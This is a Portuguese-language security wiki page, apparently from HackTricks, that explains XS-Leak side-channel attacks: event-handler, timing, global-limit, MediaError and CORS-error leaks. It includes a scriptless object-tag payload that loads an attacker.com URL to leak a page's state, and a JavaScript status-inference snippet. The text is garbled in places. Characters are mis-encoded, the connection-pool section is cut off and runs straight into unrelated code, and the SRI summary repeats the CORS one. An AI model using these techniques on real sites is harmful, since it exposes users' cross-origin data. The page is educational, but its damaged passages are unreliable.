# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informa√ß√µes B√°sicas**

XS-Search √© uma t√©cnica voltada para **exfiltrar informa√ß√µes cross-origin** abusando de **ataques de canal lateral**.

Existem diferentes elementos neste tipo de ataque:

* **Web Vulner√°vel**: √â a web de onde queremos exfiltrar alguma informa√ß√£o
* **Web do Atacante**: √â a web que o atacante cria contendo o exploit e que a v√≠tima acessa
* **M√©todo de Inclus√£o**: √â o m√©todo usado para carregar a Web Vulner√°vel a partir da Web do Atacante (como window.open, iframe, fetch, tag HTML com href...)
* **T√©cnica de Leak**: Ap√≥s acessar a web vulner√°vel, uma t√©cnica ser√° usada para diferenciar entre os poss√≠veis estados da web com as informa√ß√µes obtidas do m√©todo de inclus√£o usado.
* **Estados**: Os 2 poss√≠veis estados que a web vulner√°vel pode ter dependendo da v√≠tima que queremos diferenciar.
* **Diferen√ßas Detect√°veis**: Esta √© a informa√ß√£o que o atacante tem que tentar decidir o estado da web vulner√°vel

### Diferen√ßas Detect√°veis

Para distinguir entre os 2 estados da p√°gina vulner√°vel, v√°rias coisas podem ser observadas:

* **C√≥digo de Status**. Um atacante pode distinguir **diferentes c√≥digos de status de resposta HTTP** cross-origin (por exemplo, erros de servidor, erros de cliente ou erros de autentica√ß√£o).
* **Uso de API**. Esta diferen√ßa detect√°vel permite que um atacante detecte o **uso de APIs Web** entre p√°ginas, permitindo que um atacante infira se uma p√°gina cross-origin est√° usando uma API Web JavaScript espec√≠fica.
* **Redirecionamentos**. √â poss√≠vel detectar se uma aplica√ß√£o web **navegou o usu√°rio para uma p√°gina diferente**. Isso n√£o se limita a redirecionamentos HTTP, mas tamb√©m inclui redirecionamentos acionados por JavaScript ou HTML.
* **Conte√∫do da P√°gina**. Essas diferen√ßas detect√°veis **aparecem no corpo da resposta HTTP** ou em sub-recursos inclu√≠dos pela p√°gina. Por exemplo, isso pode ser o **n√∫mero de frames inclu√≠dos** (cf. XS-Leak no Gitlab) ou diferen√ßas de tamanho de imagens.
* **Cabe√ßalho HTTP**. Um atacante pode detectar a presen√ßa de um **cabe√ßalho de resposta HTTP espec√≠fico** e pode ser capaz de coletar seu valor. Isso inclui cabe√ßalhos como X-Frame-Options, Content-Disposition e Cross-Origin-Resource-Policy.
* **Tempo**: Um atacante pode detectar que existe uma diferen√ßa de tempo consistente entre 2 estados.

### M√©todos de Inclus√£o

* **Elementos HTML**. O HTML oferece uma variedade de elementos que permitem a **inclus√£o de recursos cross-origin**. Elementos como folhas de estilo, imagens ou scripts, for√ßam o navegador da v√≠tima a solicitar um recurso n√£o-HTML especificado. Uma lista que enumera poss√≠veis elementos HTML para esse prop√≥sito est√° dispon√≠vel online ([https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)).
* **Frames**. Elementos como **iframe**, **object** e **embed** podem incorporar recursos HTML diretamente na p√°gina do atacante. Se a p√°gina **n√£o usar prote√ß√£o contra frames**, o c√≥digo JavaScript pode acessar o objeto window do recurso emoldurado atrav√©s da propriedade contentWindow.
* **Pop-ups**. O m√©todo **`window.open`** carrega um recurso em uma nova aba ou janela do navegador. O m√©todo retorna um **manipulador de janela** que o c√≥digo JavaScript pode usar para acessar m√©todos e propriedades, que est√£o em conformidade com a SOP. Esses chamados pop-ups s√£o frequentemente usados em single sign-on. Navegadores modernos s√≥ permitem pop-ups se forem acionados por certas intera√ß√µes do usu√°rio. Para ataques XS-Leak, este m√©todo √© especialmente √∫til porque **contorna restri√ß√µes de framing e cookies para um recurso alvo**. Vers√µes mais recentes do navegador adicionaram recentemente meios para isolar manipuladores de janela.
* **Requisi√ß√µes JavaScript**. O JavaScript permite enviar solicita√ß√µes diretamente para recursos alvo. Existem duas maneiras diferentes para esse prop√≥sito: **XMLHttpRequests** e seu sucessor **Fetch API**. Em contraste com m√©todos de inclus√£o anteriores, um atacante tem controle refinado sobre a solicita√ß√£o emitida, por exemplo, se um redirecionamento HTTP deve ser automaticamente seguido.

### T√©cnicas de Leak

* **Manipulador de Eventos**. O manipulador de eventos pode ser visto como a t√©cnica cl√°ssica de leak para XS-Leaks. Eles s√£o uma fonte bem conhecida de v√°rias pe√ßas de informa√ß√£o. Por exemplo, o gatilho de **onload** indica um carregamento de recurso **bem-sucedido** em contraste com o evento onerror.
* **Mensagens de Erro**. Al√©m dos manipuladores de eventos, mensagens de erro podem ocorrer como **exce√ß√µes JavaScript** e **p√°ginas de erro especiais**. Mensagens de erro podem ser lan√ßadas em diferentes etapas, por exemplo, diretamente pela t√©cnica de leak. A t√©cnica de leak pode usar informa√ß√µes adicionais **contidas diretamente** na **mensagem de erro**, ou distinguir entre a **apar√™ncia e aus√™ncia de uma mensagem de erro**.
* **Limites Globais**. Todo computador tem seus limites f√≠sicos, assim como um navegador. Por exemplo, a quantidade de mem√≥ria dispon√≠vel limita as abas em execu√ß√£o de um navegador. O mesmo vale para outros limites do navegador que s√£o aplicados para todo o navegador. Se um atacante pode determinar **quando o limite √© atingido, isso pode ser usado como uma t√©cnica de leak**.
* **Estado Global**. Os navegadores t√™m **estados globais com os quais todas as p√°ginas podem interagir**. Se essa intera√ß√£o for detect√°vel a partir do site do atacante, ela pode ser usada como uma t√©cnica de leak. Por exemplo, a interface **History** permite a manipula√ß√£o das p√°ginas visitadas em uma aba ou frame. Isso cria um estado global porque o **n√∫mero de entradas** permite que um atacante tire conclus√µes sobre p√°ginas cross-origin.
* **API de Desempenho**. A API de Desempenho √© usada para acessar as **informa√ß√µes de desempenho da p√°gina atual**. Suas entradas incluem dados detalhados de tempo de rede para o documento e cada recurso carregado pela p√°gina. Isso permite que um atacante tire **conclus√µes sobre recursos solicitados**. Por exemplo, identificamos casos em que os navegadores n√£o criar√£o entradas de desempenho para algumas solicita√ß√µes.
* **Atributos Leg√≠veis**. O HTML possui v√°rios **atributos que s√£o leg√≠veis cross-origin**. Esse acesso de leitura pode ser usado como uma t√©cnica de leak. Por exemplo, o c√≥digo JavaScript pode ler o n√∫mero de frames inclu√≠dos em uma p√°gina web cross-origin com a propriedade window.frame.length.

#### **T√©cnicas Baseadas em Tempo**

Algumas das seguintes t√©cnicas v√£o usar o tempo como parte do processo para detectar diferen√ßas nos poss√≠veis estados das p√°ginas web. Existem diferentes maneiras de medir o tempo em um navegador web.

**Rel√≥gios**: A API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permite que desenvolvedores obtenham medi√ß√µes de tempo de alta resolu√ß√£o.\
Existem um n√∫mero consider√°vel de APIs que atacantes podem abusar para criar rel√≥gios impl√≠citos: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), anima√ß√µes CSS e outros.\
Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## XSinator

XSinator √© uma ferramenta autom√°tica para **verificar navegadores contra v√°rios XS-Leaks conhecidos** explicados em seu artigo: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
Voc√™ pode acessar a ferramenta em [https://xsinator.com/](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks Exclu√≠dos**: Tivemos que excluir XS-Leaks que dependem de **service workers**, pois interfeririam com outros leaks no XSinator. Al√©m disso, optamos por **excluir XS-Leaks que dependem de m√° configura√ß√£o e bugs em uma aplica√ß√£o web espec√≠fica**. Por exemplo, configura√ß√µes incorretas de CrossOrigin Resource Sharing (CORS), vazamento de postMessage ou Cross-Site Scripting. Adicionalmente, exclu√≠mos XS-Leaks baseados em tempo, pois muitas vezes sofrem por serem lentos, ruidosos e imprecisos.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas de Manipulador de Eventos

### Onload/Onerror

* **M√©todos de Inclus√£o**: Frames, Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Resumo**: se ao tentar carregar um recurso os eventos onerror/onload s√£o acionados com o recurso sendo carregado com sucesso/sem sucesso, √© poss√≠vel descobrir o c√≥digo de status.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

O exemplo de c√≥digo tenta **carregar objetos de scripts do JS**, mas **outras tags** como objetos, folhas de estilo, imagens, √°udios tamb√©m podem ser usadas. Al√©m disso, tamb√©m √© poss√≠vel injetar a **tag diretamente** e declarar os eventos `onload` e `onerror` dentro da tag (em vez de injet√°-la a partir do JS).

Tamb√©m existe uma vers√£o sem scripts deste ataque:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Neste caso, se `example.com/404` n√£o for encontrado, `attacker.com/?error` ser√° carregado.

### Temporiza√ß√£o Onload

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumo**: A API [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. No entanto, outros rel√≥gios poderiam ser usados, como a [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) que pode identificar tarefas executadas por mais de 50ms.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) outro exemplo em:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Temporiza√ß√£o Onload + Tarefa Pesada For√ßada

Esta t√©cnica √© semelhante √† anterior, mas o **atacante** tamb√©m ir√° **for√ßar** alguma a√ß√£o para levar um **tempo relevante** quando a **resposta for positiva ou negativa** e medir esse tempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Temporiza√ß√£o unload/beforeunload

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumo**: O rel√≥gio [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) pode ser usado para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios poderiam ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Os eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) e [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) podem ser usados para medir o tempo que leva para buscar um recurso. Isso funciona porque **`beforeunload`** √© acionado quando o navegador **solicita uma nova navega√ß√£o**, enquanto **`unload`** √© acionado quando essa **navega√ß√£o realmente ocorre**. Devido a esse comportamento, √© poss√≠vel calcular a diferen√ßa de tempo entre esses dois eventos e medir o **tempo que o navegador levou para completar a busca do recurso**.

### Temporiza√ß√£o de Frame com Sandbox + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Resumo**: A API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios poderiam ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Se uma p√°gina n√£o tiver [Prote√ß√µes de Enquadramento](https://xsleaks.dev/docs/defenses/opt-in/xfo/) implementadas, um atacante pode medir quanto tempo leva para a p√°gina e todos os subrecursos carregarem pela rede. Por padr√£o, o manipulador `onload` para um iframe √© invocado ap√≥s todos os recursos terem sido carregados e todo o JavaScript ter terminado de executar. No entanto, um atacante pode eliminar o ru√≠do da execu√ß√£o de scripts incluindo o atributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) na tag `<iframe>`. Este atributo bloqueia v√°rios recursos, incluindo a execu√ß√£o de JavaScript, o que resulta em uma medi√ß√£o quase pura da rede.

### #ID + erro + onload

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**:
* **Resumo**: Se voc√™ pode fazer a p√°gina dar erro quando o conte√∫do correto √© acessado e faz√™-la carregar corretamente quando qualquer conte√∫do √© acessado, ent√£o voc√™ pode criar um loop para extrair todas as informa√ß√µes sem medir o tempo.
* **Exemplo de C√≥digo**:

Suponha que voc√™ possa **inserir** a **p√°gina** que tem o **conte√∫do secreto** **dentro de um Iframe**.

Voc√™ pode **fazer a v√≠tima procurar** pelo arquivo que cont√©m "_**flag**_" usando um **Iframe** (explorando um CSRF, por exemplo). Dentro do Iframe, voc√™ sabe que o _**evento onload**_ ser√° **executado sempre pelo menos uma vez**. Ent√£o, voc√™ pode **mudar** a **URL** do **iframe** alterando apenas o **conte√∫do** do **hash** dentro da URL.

Por exemplo:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Se a primeira URL foi **carregada com sucesso**, ent√£o, ao **mudar** a parte do **hash** da URL, o evento **onload** **n√£o ser√° acionado** novamente. Mas **se** a p√°gina teve algum tipo de **erro** ao **carregar**, ent√£o, o evento **onload** ser√° **acionado novamente**.

Ent√£o, voc√™ pode **distinguir entre** uma p√°gina **carregada corretamente** ou uma p√°gina que tem um **erro** quando √© acessada.

### Execu√ß√£o de Javascript

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**:
* **Resumo**: Se a **p√°gina** est√° **retornando** o **conte√∫do sens√≠vel**, **ou** um **conte√∫do** que pode ser **controlado** pelo usu√°rio. O usu√°rio poderia definir **c√≥digo JS v√°lido no caso negativo**, e **carregar** cada tentativa dentro de tags **`<script>`**, ent√£o em casos **negativos** o **c√≥digo** dos atacantes **√© executado**, e em casos **afirmativos** **nada** ser√° executado.
* **Exemplo de C√≥digo**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: C√≥digo de Status & Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Resumo**: Atacantes podem observar quando o CORB √© aplicado se uma resposta retorna um `Content-Type` _protegido pelo CORB_ (e `nosniff`) com o c√≥digo de status `2xx`, o que resulta no CORB removendo o corpo e os cabe√ßalhos da resposta. Detectar essa prote√ß√£o permite que um atacante **vaze** a combina√ß√£o do **c√≥digo de status** (sucesso vs. erro) e o **`Content-Type` (protegido pelo CORB ou n√£o).**
* **Exemplo de C√≥digo**:

Verifique o link de mais informa√ß√µes para mais detalhes sobre o ataque.

### onblur

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Resumo**: Vazar dados sens√≠veis do atributo id ou name.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

√â poss√≠vel **carregar uma p√°gina** dentro de um **iframe** e usar o **`#id_value`** para fazer a p√°gina **focar no elemento** do iframe com o id indicado, ent√£o se um sinal **`onblur`** for acionado, o elemento ID existe.\
Voc√™ pode realizar o mesmo ataque com tags **`portal`**.

### Transmiss√µes postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Uso de API
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Resumo**: Coletar informa√ß√µes sens√≠veis de um postMessage ou usar a presen√ßa de postMessages como um or√°culo para saber o status do usu√°rio na p√°gina
* **Exemplo de C√≥digo**: `Qualquer c√≥digo que escute todos os postMessages.`

Aplica√ß√µes frequentemente usam [transmiss√µes postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) para compartilhar informa√ß√µes com outras origens. Escutando essas mensagens, pode-se encontrar **informa√ß√µes sens√≠veis** (potencialmente se o par√¢metro `targetOrigin` n√£o for usado). Al√©m disso, o fato de receber alguma mensagem pode ser **usado como um or√°culo** (voc√™ s√≥ recebe esse tipo de mensagem se estiver logado).

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas de Limites Globais

### API WebSocket

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Uso de API
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumo**: Esgotar o limite de conex√µes WebSocket vaza o n√∫mero de conex√µes WebSocket de uma p√°gina de origem cruzada.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

√â poss√≠vel identificar se, e quantas, **conex√µes WebSocket uma p√°gina alvo usa**. Isso permite que um atacante detecte estados de aplica√ß√£o e vaze informa√ß√µes ligadas ao n√∫mero de conex√µes WebSocket.

Se uma **origem** usa a **quantidade m√°xima de objetos de conex√£o WebSocket**, independentemente do estado de suas conex√µes, a cria√ß√£o de **novos objetos resultar√° em exce√ß√µes JavaScript**. Para executar esse ataque, o site do atacante abre o site alvo em um pop-up ou iframe e, depois que a web alvo foi carregada, tenta criar o n√∫mero m√°ximo de conex√µes WebSocket poss√≠vel. O **n√∫mero de exce√ß√µes lan√ßadas** √© o **n√∫mero de conex√µes WebSocket usadas pela janela do site alvo**.

### API de Pagamento

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Uso de API
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumo**: Detectar Pedido de Pagamento porque apenas um pode estar ativo por vez.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Este XS-Leak permite que um atacante **detecte quando uma p√°gina de origem cruzada inicia um pedido de pagamento**.

Como **apenas um pedido de pagamento pode estar ativo** ao mesmo tempo, se o site alvo estiver usando a API de Pedido de Pagamento, qualquer **tentativa posterior de usar esta API falhar√°**, e causar√° uma **exce√ß√£o JavaScript**. O atacante pode explorar isso **tentando periodicamente mostrar a UI da API de Pagamento**. Se uma tentativa causar uma exce√ß√£o, o site alvo est√° atualmente usando-a. O atacante pode esconder essas tentativas peri√≥dicas fechando imediatamente a UI ap√≥s a cria√ß√£o.

### Temporiza√ß√£o do Loop de Eventos <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **M√©todos de Inclus√£o**:
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Resumo**: Medir o tempo de execu√ß√£o de uma web abusando do loop de eventos JS de thread √∫nico.
* **Exemplo de C√≥digo**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

O modelo de concorr√™ncia do JavaScript √© baseado em um [loop de eventos de thread √∫nico](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), o que significa **que ele s√≥ pode executar uma tarefa por vez**.\
Inferir **quanto tempo o c√≥digo de uma origem diferente leva para executar** medindo quanto tempo **leva para executar a seguir no pool de eventos**. O atacante continua enviando eventos para o loop de eventos com propriedades fixas, que eventualmente ser√£o despachados se o pool estiver vazio. Outras origens despacham eventos para o mesmo pool, e √© aqui que um **atacante infere a diferen√ßa de tempo detectando se um atraso ocorreu com uma de suas tarefas**.

{% hint style="warning" %}
Em uma temporiza√ß√£o de execu√ß√£o √© poss√≠vel **eliminar** **fatores de rede** para obter **medi√ß√µes mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Loop de Eventos Ocupado <a href="#busy-event-loop" id="busy-event-loop"></a>

* **M√©todos de Inclus√£o**:
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Resumo**: Medir o tempo de execu√ß√£o de uma web bloqueando o loop de eventos de um thread e medindo **quanto tempo leva para o loop de eventos ficar dispon√≠vel novamente**.
* **Exemplo de C√≥digo**:

Uma das principais vantagens desta t√©cnica √© sua capacidade de contornar a Isolamento de Site, pois uma origem atacante pode influenciar a execu√ß√£o de outra origem.

{% hint style="warning" %}
Em uma temporiza√ß√£o de execu√ß√£o √© poss√≠vel **eliminar** **fatores de rede** para obter **medi√ß√µes mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Pool de Conex√µes

* **M√©todos de Inclus√£o**: Solicita√ß√µes JavaScript
* **Diferen√ßa Detect√°vel**: Temporiza√ß√£o (geralmente devido ao Conte√∫do da P√°gina
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
```markdown
A propriedade message da interface **`MediaError`** cont√©m uma **string diferente para recursos que carregam com sucesso**. Isso permite que um atacante infira o status da resposta para um recurso de origem cruzada.

### Erro CORS

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo:** Em SA, mensagens de erro CORS revelam a URL completa dos redirecionamentos.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Esta t√©cnica permite que um atacante revele o alvo de um redirecionamento iniciado por um site de origem cruzada.

CORS permite que recursos web publicamente acess√≠veis sejam lidos e usados de qualquer site. Em navegadores baseados em Webkit, √© poss√≠vel **acessar mensagens de erro CORS quando uma solicita√ß√£o CORS falha**. Um atacante pode enviar uma solicita√ß√£o habilitada para CORS a um site alvo que **redireciona** com base no estado do usu√°rio. Quando o navegador nega a solicita√ß√£o, a **URL completa do alvo do redirecionamento √© revelada** na mensagem de erro. Com este ataque, √© poss√≠vel detectar redirecionamentos, revelar locais de redirecionamento e par√¢metros de consulta sens√≠veis.

### Erro SRI

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo:** Em SA, mensagens de erro CORS revelam a URL completa dos redirecionamentos.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Um atacante pode revelar o tamanho das respostas de origem cruzada devido a **mensagens de erro detalhadas**.

